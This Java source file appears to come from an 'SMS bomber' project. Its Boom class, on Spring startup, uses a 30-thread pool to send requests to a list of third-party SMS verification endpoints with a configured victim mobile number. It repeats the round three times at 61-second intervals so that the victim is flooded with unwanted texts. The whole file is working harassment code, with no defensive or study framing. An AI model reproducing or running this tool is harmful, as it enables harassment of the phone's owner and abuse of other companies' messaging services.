package com.lzj.smsboom.app;

import com.lzj.smsboom.bean.ProxyTargetEntry;
import com.lzj.smsboom.utils.SmsBoomURL;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.BeansException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;
import org.springframework.http.HttpMethod;
import org.springframework.web.client.RestTemplate;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * @Description:
 * @Author: LZJ
 * @Date： 2019/11/14 21:31
 */

public class Boom implements ApplicationContextAware {

    @Autowired
    private RestTemplate restTemplate;

    private static final Logger log= LoggerFactory.getLogger(ApplicationContextAware.class);

    @Value("${smsboom.targetMobile}")
    private String tagetMobile;

    //Spring初始化完成 开始轰炸
    @Override
    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
        List<ProxyTargetEntry> proxyTargetEntryList = SmsBoomURL.proxyTargetEntryList;
        ExecutorService executorService = Executors.newFixedThreadPool(30);
        for (int i = 0; i < 3; i++) {
            for (ProxyTargetEntry proxyTargetEntry : proxyTargetEntryList) {
                try {
                    executorService.submit(()->{
                        HttpMethod httpMethod = proxyTargetEntry.getHttpMethod();
                        if (httpMethod.equals(HttpMethod.GET)){
                            restTemplate.exchange(proxyTargetEntry.getUrl(), HttpMethod.GET, proxyTargetEntry.getHttpEntity(), String.class, tagetMobile);
                        }else {
                            restTemplate.exchange(proxyTargetEntry.getUrl(), HttpMethod.POST, proxyTargetEntry.getHttpEntity(), String.class);
                        }
                    });
                } catch (Exception e) {
                    log.error("短信发送失败 {}",proxyTargetEntry.getUrl(),e);
                }
            }
            try {
                TimeUnit.SECONDS.sleep(61);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

}
